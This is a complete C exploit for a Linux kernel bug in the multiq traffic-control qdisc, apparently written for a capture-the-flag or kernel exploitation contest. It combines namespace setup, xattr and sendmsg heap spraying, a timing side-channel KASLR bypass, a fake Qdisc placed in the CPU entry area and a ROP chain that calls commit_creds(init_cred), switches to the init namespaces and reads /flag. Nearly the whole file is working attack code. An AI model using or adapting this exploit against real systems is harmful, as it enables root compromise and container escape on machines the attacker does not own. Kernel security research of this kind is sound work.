#define _GNU_SOURCE

#define _GNU_SOURCE

#include <endian.h>
#include <sys/syscall.h>
#include <linux/membarrier.h>
#include <arpa/inet.h>
#include <sched.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <err.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <inttypes.h>
#include <math.h>
#include <pthread.h>
#include <assert.h>

#include <linux/keyctl.h>

#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/ioctl.h>
#include <linux/if_link.h>
#include <net/if.h>

#include <linux/ethtool.h>
#include <linux/sockios.h>
#include <linux/tc_ematch/tc_em_meta.h>
#include <linux/rtnetlink.h>


#define PANIC_IF(x) if ((x)) { \
    perror(#x); \
    exit(errno); \
}

#define CPU_ENTRY_AREA_BASE(cpu) (0xfffffe0000001000ull + (uint64_t)cpu * 0x3b000)
#define PAYLOAD_LOCATION(cpu) (CPU_ENTRY_AREA_BASE(cpu) + 0x1f58)

#ifndef IFLA_VETH_INFO_PEER
#define IFLA_VETH_INFO_PEER 1
#endif

#ifndef SIOCETHTOOL
#define SIOCETHTOOL 0x8946
#endif


int sockfd = -1;
uint64_t kbase, kheap;
uint64_t shared[0x1000];
int qdisc_ifindex = 9;

#ifndef NLMSG_TAIL
#define NLMSG_TAIL(nmsg) \
    ((struct rtattr *)(((void *)(nmsg)) + NLMSG_ALIGN((nmsg)->nlmsg_len)))
#endif

static struct rtattr *addattr_nest(struct nlmsghdr *n, size_t maxlen, int type)
{
    size_t len = NLMSG_ALIGN(n->nlmsg_len);
    size_t attr_len = RTA_LENGTH(0);
    if (len + attr_len > maxlen)
        return NULL;
    struct rtattr *nest = (struct rtattr *)(((char *)n) + len);
    nest->rta_type = type;
    nest->rta_len = attr_len;
    n->nlmsg_len = len + attr_len;
    return nest;
}

static void addattr_nest_end(struct nlmsghdr *n, struct rtattr *nest)
{
    nest->rta_len = (char *)NLMSG_TAIL(n) - (char *)nest;
}

static int rtnl_talk(struct nlmsghdr *nlh)
{
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct iovec iov = {.iov_base = nlh, .iov_len = nlh->nlmsg_len};
    struct msghdr msg = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    int fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);
    if (fd < 0)
        return -1;

    if (sendmsg(fd, &msg, 0) < 0) {
        close(fd);
        return -1;
    }

    char buf[4096];
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    int len = recvmsg(fd, &msg, 0);
    if (len < 0) {
        close(fd);
        return -1;
    }

    struct nlmsghdr *reply = (struct nlmsghdr *)buf;
    if (reply->nlmsg_type == NLMSG_ERROR) {
        struct nlmsgerr *err = (struct nlmsgerr *)NLMSG_DATA(reply);
        if (err->error) {
            errno = -err->error;
            close(fd);
            return -1;
        }
    }

    close(fd);
    return 0;
}

static int create_veth_with_queues(const char *ifname, uint32_t rx_queues, uint32_t tx_queues)
{
    char buf[4096] = {0};
    struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
    struct ifinfomsg *ifi = (struct ifinfomsg *)NLMSG_DATA(nlh);

    nlh->nlmsg_len = NLMSG_LENGTH(sizeof(*ifi));
    nlh->nlmsg_type = RTM_NEWLINK;
    nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK;
    nlh->nlmsg_seq = 0;
    nlh->nlmsg_pid = 0;
    ifi->ifi_family = AF_UNSPEC;

    if (addattr_l(nlh, sizeof(buf), IFLA_IFNAME, (void *)ifname, strlen(ifname) + 1) < 0)
        return -1;
    addattr_l(nlh, sizeof(buf), IFLA_NUM_RX_QUEUES, &rx_queues, sizeof(rx_queues));
    addattr_l(nlh, sizeof(buf), IFLA_NUM_TX_QUEUES, &tx_queues, sizeof(tx_queues));

    struct rtattr *linkinfo = addattr_nest(nlh, sizeof(buf), IFLA_LINKINFO);
    if (!linkinfo)
        return -1;
    addattr_l(nlh, sizeof(buf), IFLA_INFO_KIND, "veth", strlen("veth") + 1);

    struct rtattr *infodata = addattr_nest(nlh, sizeof(buf), IFLA_INFO_DATA);
    if (!infodata)
        return -1;

    struct rtattr *peer = addattr_nest(nlh, sizeof(buf), IFLA_VETH_INFO_PEER);
    if (!peer)
        return -1;

    int aligned = NLMSG_ALIGN(nlh->nlmsg_len);
    if (aligned + NLMSG_ALIGN(sizeof(struct ifinfomsg)) > sizeof(buf)) {
        errno = EMSGSIZE;
        return -1;
    }
    struct ifinfomsg *peer_ifi = (struct ifinfomsg *)(((char *)nlh) + aligned);
    memset(peer_ifi, 0, sizeof(*peer_ifi));
    peer_ifi->ifi_family = AF_UNSPEC;
    nlh->nlmsg_len = aligned + NLMSG_ALIGN(sizeof(*peer_ifi));

    const char *peer_name = "qdisc_peer";
    addattr_l(nlh, sizeof(buf), IFLA_IFNAME, (void *)peer_name, strlen(peer_name) + 1);
    addattr_l(nlh, sizeof(buf), IFLA_NUM_RX_QUEUES, &rx_queues, sizeof(rx_queues));
    addattr_l(nlh, sizeof(buf), IFLA_NUM_TX_QUEUES, &tx_queues, sizeof(tx_queues));

    addattr_nest_end(nlh, peer);
    addattr_nest_end(nlh, infodata);
    addattr_nest_end(nlh, linkinfo);

    if (rtnl_talk(nlh) < 0)
        return -1;

    int ifindex = if_nametoindex(ifname);
    if (ifindex == 0) {
        errno = ENODEV;
        return -1;
    }

    return ifindex;
}

static int set_ethtool_tx_channels(const char *ifname, uint32_t tx_count)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0)
        return -1;

    struct ifreq ifr = {};
    struct ethtool_channels chans = {.cmd = ETHTOOL_GCHANNELS};

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    ifr.ifr_data = (void *)&chans;

    if (ioctl(fd, SIOCETHTOOL, &ifr) < 0) {
        close(fd);
        return -1;
    }

    chans.cmd = ETHTOOL_SCHANNELS;
    chans.tx_count = tx_count;
    ifr.ifr_data = (void *)&chans;

    int ret = ioctl(fd, SIOCETHTOOL, &ifr);
    close(fd);
    return ret;
}

// based on https://github.com/Markakd/CVE-2022-2588/blob/master/exp_file_credential.c
int addattr_l(struct nlmsghdr *n, int maxlen, int type, void *data, int alen)
{
    int len = RTA_LENGTH(alen);
    struct rtattr *rta;
    if (NLMSG_ALIGN(n->nlmsg_len) + len > maxlen)
        return -1;
    rta = (struct rtattr*)(((char*)n) + NLMSG_ALIGN(n->nlmsg_len));
    rta->rta_type = type;
    rta->rta_len = len;
    memcpy(RTA_DATA(rta), data, alen);
    n->nlmsg_len = NLMSG_ALIGN(n->nlmsg_len) + len;
    return 0;
}

int add_qdisc(int fd) {
    char *start = malloc(0x1000);
    memset(start, 0, 0x1000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    // new qdisc
    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | NLM_F_EXCL | NLM_F_CREATE;
    msg->nlmsg_type = RTM_NEWQDISC;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));
    // set local
    t->tcm_ifindex = qdisc_ifindex;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;
    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    
    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

  // packing
#ifdef DEBUG
    DumpHex(msg, msg->nlmsg_len);
#endif

    addattr_l(msg, 0x1000, TCA_OPTIONS, "12342134", 8);

    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };
    return sendmsg(fd, &msgh, 0);
}

int add_tc_(int fd, u_int32_t from, u_int32_t to, u_int32_t handle,
            u_int16_t flags) {
    char *start = malloc(0x2000);
    memset(start, 0, 0x2000);
    struct nlmsghdr *msg = (struct nlmsghdr *)start;

    msg->nlmsg_len = NLMSG_LENGTH(sizeof(struct tcmsg));
    msg->nlmsg_flags = NLM_F_REQUEST | flags;
    msg->nlmsg_type = RTM_NEWQDISC;
    struct tcmsg *t = (struct tcmsg *)(start + sizeof(struct nlmsghdr));

    // prio, protocol
    u_int32_t prio = 1;
    u_int32_t protocol = 1;
    t->tcm_info = TC_H_MAKE(prio << 16, protocol);
    t->tcm_ifindex = qdisc_ifindex;
    t->tcm_family = AF_UNSPEC;
    t->tcm_parent = TC_H_ROOT;

    addattr_l(msg, 0x1000, TCA_KIND, "multiq", 7);

    addattr_l(msg, 0x1000, TCA_OPTIONS, "12342134", 8);

    // packing
    struct iovec iov = {.iov_base = msg, .iov_len = msg->nlmsg_len};
    struct sockaddr_nl nladdr = {.nl_family = AF_NETLINK};
    struct msghdr msgh = {
        .msg_name = &nladdr,
        .msg_namelen = sizeof(nladdr),
        .msg_iov = &iov,
        .msg_iovlen = 1,
    };

    sendmsg(fd, &msgh, 0);

    free(start);
    return 1;
}

void add_tc(int sockfd, uint32_t handle, uint16_t flag) {
    add_tc_(sockfd, 0, 0, handle, flag);
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

int cpu_affinity(int cpu_idx)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(cpu_idx, &mask);
	return sched_setaffinity(0, sizeof(mask), &mask);
}

char XATTR_FILE[0x100];
#define XATTR_VALUE "value"

#define XATTR_PADDING_STR "security.attr"
#define ATTRIBUTE_NAME_LEN 0x100
#define VALUE_NAME_LEN 0x400 - 0x20
#define HEAD_VALUE_NAME_LEN 0x100
#define FILENAME_LEN 0x80

typedef struct xattr_node {
	uint64_t next, priv;
	uint64_t nameptr;
	uint64_t size;
	char value[];
} xattr_node;

#define XATTR_HEADER_SIZE sizeof(xattr_node)
#define XATTR_VALUE_CG_64 (0x40 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_128 (0x80 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_192 (0xc0 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_256 (0x100 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_512 (0x200 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_1K (0x400 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_2K (0x800 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_8K (0x2000 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_16K (0x4000 - XATTR_HEADER_SIZE)
#define XATTR_VALUE_CG_32K (0x8000 - XATTR_HEADER_SIZE)

char file_name[FILENAME_LEN];
char value_name[XATTR_VALUE_CG_32K] = {0, };
char attribute_name[XATTR_VALUE_CG_32K];

void xattr_file_init(uint64_t last)
{
	char file_name[FILENAME_LEN];
    snprintf(XATTR_FILE, FILENAME_LEN, "%s-%d", "/tmp/a", time(NULL));

    for (uint64_t i = 0; i <last; i++) {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
		int fd = creat(file_name, 0644);
		if(fd < 0) {
			perror("creat");
            sleep(10000);
        }
		close(fd);
    }
}

void create_xattr(const char *filename, char *attribute_name, char *value_name, uint64_t size) {
    if (setxattr(filename, attribute_name, value_name, size, XATTR_CREATE) < 0) {
        perror("setxattr");
        sleep(10000);
    }
}

int remove_xattr(const char *filename, char *attribute_name) {
	if (removexattr(filename, attribute_name) < 0)
	{
		perror("removexattr");
        sleep(10000);
		return -1;
	}
	return 0;
}

typedef int32_t key_serial_t;
static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid)
{
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

#define BUF_SIZE 0x3000
#define PAGE_SIZE 0x1000
int msg_sockfd;

uint64_t fake_qdisc_offset = 0x1077ff8 - 0x7f0 + sizeof(struct xattr_node) + 0x30;

// https://nonetype.kr/posts/Linux-Kernel-Heap-Spraying/
void spray_sendmsg() {
    unsigned long buf[BUF_SIZE];
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};

    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);  
    ((uint64_t *)(buf))[0] = PAYLOAD_LOCATION(1);

    msg.msg_control = buf;
    msg.msg_controllen = BUF_SIZE;
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);

    sendmsg(sockfd, &msg, 0);
}

static void sig_handler(int s) {
    // usleep(100);
    usleep(400);
}

static __attribute__((noreturn)) void write_cpu_entry_area(void* payload) {
  asm volatile (
	  "mov %0, %%rsp\n"
	  "pop %%r15\n"
	  "pop %%r14\n"
	  "pop %%r13\n"
	  "pop %%r12\n"
	  "pop %%rbp\n"
	  "pop %%rbx\n"
	  "pop %%r11\n"
	  "pop %%r10\n"
	  "pop %%r9\n"
	  "pop %%r8\n"
	  "pop %%rax\n"
	  "pop %%rcx\n"
	  "pop %%rdx\n"
	  "pop %%rsi\n"
	  "pop %%rdi\n"
	  "divq (0x1234000)\n"
    "1:\n"
    "jmp 1b\n"
    : : "r"(payload)
  );
  __builtin_unreachable();
}

struct Qdisc {
    int                        (*enqueue)(struct sk_buff *, struct Qdisc *, struct sk_buff * *); /*     0     8 */
    struct sk_buff *           (*dequeue)(struct Qdisc *); /*     8     8 */
    uint32_t                   flags;                /*    16     4 */
    uint32_t                   limit;                /*    20     4 */
    const struct Qdisc_ops  *  ops;                  /*    24     8 */
    struct qdisc_size_table *  stab;                 /*    32     8 */
    struct hlist_node          {
        void *a, *b;
    } hash;                 /*    40    16 */
    uint32_t                   handle;               /*    56     4 */
    uint32_t                   parent;               /*    60     4 */
    /* --- cacheline 1 boundary (64 bytes) --- */
    struct netdev_queue *      dev_queue;            /*    64     8 */
    struct net_rate_estimator * rate_est;            /*    72     8 */
    struct gnet_stats_basic_sync * cpu_bstats;       /*    80     8 */
    struct gnet_stats_queue *  cpu_qstats;           /*    88     8 */
    int                        pad;                  /*    96     4 */
    uint32_t                   refcnt;               /*   100     4 */
};

struct cpu_entry_area_payload {
  union {
    struct Object {
        struct Qdisc qdisc;
        uint64_t v1, v2, v3;
    } obj;
    uint64_t regs[16];
  };
};

struct Qdisc_ops {
	struct Qdisc_ops *         next;                 /*     0     8 */
	const struct Qdisc_class_ops  * cl_ops;          /*     8     8 */
	char                       id[16];               /*    16    16 */
	int                        priv_size;            /*    32     4 */
	unsigned int               static_flags;         /*    36     4 */
	int                        (*enqueue)(struct sk_buff *, struct Qdisc *, struct sk_buff * *); /*    40     8 */
	struct sk_buff *           (*dequeue)(struct Qdisc *); /*    48     8 */
	struct sk_buff *           (*peek)(struct Qdisc *); /*    56     8 */
	/* --- cacheline 1 boundary (64 bytes) --- */
	int                        (*init)(struct Qdisc *, struct nlattr *, struct netlink_ext_ack *); /*    64     8 */
	void                       (*reset)(struct Qdisc *); /*    72     8 */
	void                       (*destroy)(struct Qdisc *); /*    80     8 */
	int                        (*change)(struct Qdisc *, struct nlattr *, struct netlink_ext_ack *); /*    88     8 */
	void                       (*attach)(struct Qdisc *); /*    96     8 */
	int                        (*change_tx_queue_len)(struct Qdisc *, unsigned int); /*   104     8 */
	void                       (*change_real_num_tx)(struct Qdisc *, unsigned int); /*   112     8 */
	int                        (*dump)(struct Qdisc *, struct sk_buff *); /*   120     8 */
	/* --- cacheline 2 boundary (128 bytes) --- */
	int                        (*dump_stats)(struct Qdisc *, struct gnet_dump *); /*   128     8 */
	void                       (*ingress_block_set)(struct Qdisc *, uint32_t); /*   136     8 */
	void                       (*egress_block_set)(struct Qdisc *, uint32_t); /*   144     8 */
	uint32_t                   (*ingress_block_get)(struct Qdisc *); /*   152     8 */
	uint32_t                   (*egress_block_get)(struct Qdisc *); /*   160     8 */
	struct module *            owner;                /*   168     8 */

	/* size: 176, cachelines: 3, members: 22 */
	/* last cacheline: 48 bytes */
};

static void setup_cpu_entry_area() {
    if (fork()) {
        return;
    }

    // rbp <- ptr + 0x100
    uint64_t mov_rsp_rbp_prbp = kbase + 0x13375c; // 0xffffffff8113375c : mov rsp, rbp ; pop rbp ; ret

    uint64_t prdi_rsi_rdx_rcx = kbase + 0xd5e09;

    uint64_t longjump_victim_address = kbase + 0x2853b40;
    uint64_t wakeup_long64_call = kbase + 0x10aec1;

    uint64_t copy_from_user = kbase + 0x873f80;

    uint64_t pop_rdi = kbase + 0x1a345;
    uint64_t ret = pop_rdi + 0x1;

    struct cpu_entry_area_payload payload = {};
    payload.obj.qdisc.enqueue = 0xdeadbeef;
    payload.obj.qdisc.dequeue = 0xcafebabe;
    payload.obj.qdisc.flags = 2; // TCQ_F_INGRESS
    payload.obj.qdisc.stab = NULL;
    payload.obj.qdisc.rate_est = NULL;
    payload.obj.qdisc.refcnt = 1;


    payload.obj.qdisc.ops = PAYLOAD_LOCATION(1) + 32;
    payload.obj.v1 = mov_rsp_rbp_prbp;
    // payload.obj.v1 = 0xffffdeadbeefcafe;
    payload.obj.qdisc.hash.a = prdi_rsi_rdx_rcx;
    payload.obj.qdisc.hash.b = longjump_victim_address;
    *((uint64_t *)&payload.obj.qdisc.handle) = shared;
    payload.obj.qdisc.dev_queue = 200;

    payload.obj.qdisc.cpu_bstats = copy_from_user;
    payload.obj.qdisc.cpu_qstats = wakeup_long64_call;
    

    PANIC_IF(cpu_affinity(1) < 0);
    PANIC_IF(signal(SIGFPE, sig_handler) == SIG_ERR);
    PANIC_IF(signal(SIGTRAP, sig_handler) == SIG_ERR);
    PANIC_IF(signal(SIGSEGV, sig_handler) == SIG_ERR);
    PANIC_IF(setsid() == -1);

    write_cpu_entry_area(&payload);
}   

void *race1(int pip1[2])
{
    cpu_affinity(0);
    snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, 0x300-5);
    snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 1, XATTR_PADDING_STR);
    remove_xattr(file_name, attribute_name);

    write(pip1[1], "1", 1);

    add_tc(sockfd, 0x1000, NLM_F_CREATE);
    sleep(1);
    exit(0);
}

void *race2(int pip1[2])
{
    char pbuf[0x10];
    cpu_affinity(1);
    for(int i=0x0; i<0x1; i++)
    {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 2, XATTR_PADDING_STR);
        remove_xattr(file_name, attribute_name);
    }
    read(pip1[0], pbuf, 1);
    nanosleep((const struct timespec[]){{0, 2000}}, NULL);
    cpu_affinity(1);
    spray_sendmsg();
    sleep(1);
    exit(0);
}


#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

// KASLR bypass
//
// This code is adapted from https://github.com/IAIK/prefetch/blob/master/cacheutils.h
//
inline __attribute__((always_inline)) uint64_t rdtsc_begin() {
  uint64_t a, d;
  asm volatile ("mfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end() {
  uint64_t a, d;
  asm volatile(
    "xor %%rax, %%rax\n\t"
    "lfence\n\t"
    "RDTSCP\n\t"
    "mov %%rdx, %0\n\t"
    "mov %%rax, %1\n\t"
    "mfence\n\t"
    : "=r" (d), "=r" (a)
    :
    : "%rax", "%rbx", "%rcx", "%rdx");
  a = (d<<32) | a;
  return a;
}

void prefetch(void* p)
{
  asm volatile (
    "prefetchnta (%0)\n"
    "prefetcht2 (%0)\n"
    : : "r" (p));
}

size_t flushandreload(void* addr) // row miss
{
  size_t time = rdtsc_begin();
  prefetch(addr);
  size_t delta = rdtsc_end() - time;
  return delta;
}

int bypass_kaslr(uint64_t base) {
    if (!base) {
    //   #ifdef KASLR_BYPASS_INTEL
        #define OFFSET 0
        #define START (0xffffffff81000000ull + OFFSET)
        #define END   (0xffffffffD0000000ull + OFFSET)
        #define STEP   0x0000000001000000ull
        while (1) {
            uint64_t bases[7] = {0};
            for (int vote = 0; vote < ARRAY_LEN(bases); vote ++) {
                size_t times[(END - START) / STEP] = {};
                uint64_t addrs[(END - START) / STEP];

                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    times[ti] = ~0;
                    addrs[ti] = START + STEP * (uint64_t)ti;
                }

                for (int i = 0; i < 16; i++) {
                for (int ti = 0; ti < ARRAY_LEN(times); ti++) {
                    uint64_t addr = addrs[ti];
                    size_t t = flushandreload((void*)addr);
                    if (t < times[ti]) {
                        times[ti] = t;
                    }
                }
                }

                size_t minv = ~0;
                size_t mini = -1;
                for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++) {
                    if (times[ti] < minv) {
                        mini = ti;
                        minv = times[ti];
                    }
                }

                if (mini < 0) {
                    return -1;
                }

                bases[vote] = addrs[mini];
            }

            int c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (c == 0) {
                base = bases[i];
              } else if (base == bases[i]) {
                c++;
              } else {
                c--;
              }
            }

            c = 0;
            for (int i = 0; i < ARRAY_LEN(bases); i++) {
              if (base == bases[i]) {
                c++;
              }
            }
            if (c > ARRAY_LEN(bases) / 2) {
              base -= OFFSET;
              goto got_base;
            }

            // printf("majority vote failed:\n");
            // printf("base = %llx with %d votes\n", base, c);
        }
    }

got_base:
    printf("using kernel base %llx\n", base);

    kbase = base;

    return 0;
}


size_t user_cs, user_ss, user_sp, user_rflags;
void save_state() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;"
  );
}

void get_shell() {
	if(setns(open("/proc/1/ns/mnt", O_RDONLY), CLONE_NEWNS) < 0)
        perror("setns_mnt");
	if(setns(open("/proc/1/ns/pid", O_RDONLY), 0) < 0)
        perror("setns_pid");
    if(setns(open("/proc/1/ns/net", O_RDONLY), 0) < 0)
        perror("setns_net");

	system("cat /flag");

    if(!getuid()) {
        sleep(10000);
    }
}

int trig() {
    bypass_kaslr(0);
    save_state();

    uint64_t init_cred = kbase + 0x02876960;
    uint64_t commit_cred = kbase + 0x001c55a0;
    uint64_t prepare_kernel_cred = kbase + 0x001c5840;

    uint64_t find_task_by_vpid = kbase + 0x1bbe60;
    uint64_t switch_task_namespaces = kbase + 0x1c3a30;
    uint64_t set_memory_x = kbase + 0x12fef0;

    uint64_t init_nsproxy = kbase + 0x2876720;

    uint64_t msleep = kbase + 0x230f20;
    uint64_t ret_from_fork = kbase + 0x2cd0;

    uint64_t pop_rdi = kbase + 0x1a345;
    uint64_t pop_rsi = kbase + 0x7d79e;
    uint64_t pop_rdx = kbase + 0x2bb0d2;
    uint64_t mov_rdi_rax = kbase + 0x6d466a; // mov rdi, rax ; mov dword ptr [rdx], ecx ; mov rax, rdi ; jmp 0xffffffff82404c80
    uint64_t swapgs = kbase + 0x1192e1d;
    uint64_t iretq = kbase + 0x12011d7;
    uint64_t ret = pop_rdi + 0x1;

    uint64_t longjump_victim_address = kbase + 0x2853b40;

    // wakeup_long64 
	uint64_t longjump[] = {
		0x0, // rbp
		0x1, // rsi
		longjump_victim_address & (~0xfff), // rdi
		0x0, // rbx
		ret, // rip -> ret
		longjump_victim_address + 0x8*6, // rsp -> stack pivot to longjump victim address

        pop_rdi,
		init_cred,
		commit_cred, // commit_cred(init_cred);

		pop_rdi, // pop rdi; ret;
		1,
		find_task_by_vpid, // find_task_by_vpid(1)

        pop_rdx,
        longjump_victim_address,
        mov_rdi_rax,

		pop_rsi,
		init_nsproxy,
		switch_task_namespaces, // switch_task_namespaces(task, init_nsproxy)
        // 0xffffdeadbeefcafe,

        // ret_from_fork,
        // pop_rdi,
        // 0x100000,
        // msleep,

		swapgs,
        iretq,
		get_shell,
		user_cs,
		user_rflags,
		user_sp,
		user_ss, 
	};



    memcpy(shared, longjump, sizeof(longjump));

    setup_cpu_entry_area();
    sleep(1);
    unshare_setup(getuid(), getgid());

    cpu_affinity(0);

    int pip1[2], pip2[2], pip3[2];
    pipe(pip1);
	pipe(pip2);
	pipe(pip3);

	uint64_t init_size = 0x1000;
	uint64_t removed_size = 0x800;
	
	uint64_t first_size = init_size - (removed_size - 0x100);

	assert(removed_size < first_size);

    const char *qdisc_name = "qdisc_exp";

    qdisc_ifindex = create_veth_with_queues(qdisc_name, 2048, (uint32_t)init_size);
    PANIC_IF(qdisc_ifindex < 0);
    PANIC_IF(set_ethtool_tx_channels(qdisc_name, (uint32_t)first_size) < 0);

    sockfd = socket(PF_NETLINK, SOCK_RAW, 0);
    assert(sockfd != -1);

    add_qdisc(sockfd);

    uint64_t default_oob = first_size - removed_size;
	uint64_t oob_sz = 0x1;

    PANIC_IF(set_ethtool_tx_channels(qdisc_name, (uint32_t)(default_oob - oob_sz)) < 0);

    xattr_file_init(0x5000);
    uint64_t ptr = kheap + fake_qdisc_offset;
    memset(value_name, 0x41, sizeof(value_name));
    struct Qdisc fake_qdisc = {
        .enqueue = 0xdead,
        .dequeue = 0xbeef,
        .ops = ptr + 0x100,
        .refcnt = 1,
        .flags = 0
    };

    // ops->reset(qdisc);
    struct Qdisc_ops fakeops = {
        .reset = 0xdeadbeefcafe
    };
    memcpy(((char *)value_name) + 0x30, &fake_qdisc, sizeof(fake_qdisc));
    memcpy(((char *)value_name) + 0x130, &fakeops, sizeof(fakeops));

    for(int i=0; i<=0x300; i++)
    {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
        snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 1, XATTR_PADDING_STR);
        create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_16K);
    }
    for(int i=0; i<=0x300; i+=2)
    {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 1, XATTR_PADDING_STR);
        remove_xattr(file_name, attribute_name);
    }

    printf("--------------------------------------------------------------\n");
    
    cpu_affinity(1);
    for(int i=0; i<=0x100; i++)
    {
        snprintf(file_name, FILENAME_LEN, "%s-%08d", XATTR_FILE, i);
        snprintf(value_name, VALUE_NAME_LEN, "security.value%05lu-%s", i, XATTR_PADDING_STR);
        snprintf(attribute_name, ATTRIBUTE_NAME_LEN, "security.attr%26lu-%s", 2, XATTR_PADDING_STR);
        create_xattr(file_name, attribute_name, value_name, XATTR_VALUE_CG_16K);
    }

    printf("--------------------------------------------------------------\n");

    char pbuf[0x10];
    char *buf = malloc(0x1000);
    memset(buf, 0x41, 0x1000);


    signal(SIGSEGV, get_shell);
    if(!fork())
        race1(pip1);
    race2(pip1);
}

int main(int argc, char **argv) {

    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(0, &my_set);

    if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
        perror("[-] sched_setaffinity()");
        exit(EXIT_FAILURE);
    }

    for(int i=0; i<30; i++) {
        int pid;
        if(!(pid = fork())) {
            trig();
        } else {
            wait(&pid);
        }
    }
    exit(0);
}
